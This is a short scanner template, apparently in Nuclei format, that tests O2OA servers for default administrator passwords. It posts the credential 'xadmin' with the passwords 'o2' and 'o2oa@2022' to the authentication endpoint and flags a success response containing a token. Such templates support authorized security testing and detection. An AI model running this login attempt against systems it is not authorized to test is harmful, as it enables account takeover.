id: poc-yaml-zoneland-o2oa-default-password-login
info:
  name: O2OA Default Password Login
  author: ProjectDiscoveryAI
  severity: high
  tags: weak-password,o2oa
http:
  - method: POST
    path:
      - "/x_organization_assemble_authentication/jaxrs/authentication/"
    headers:
      X-Requested-With: XMLHttpRequest
      Content-Type: application/json; charset=UTF-8
    payloads:
      pass:
        - "o2"
        - "o2oa@2022"
    body: |
      {"credential":"xadmin","password":"{{pass}}"}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "\"type\": \"success\""
          - "\"token\""
          - "\"id\""
          - "\"name\""
        part: body
      - type: word
        words:
          - "application/json"
        part: header
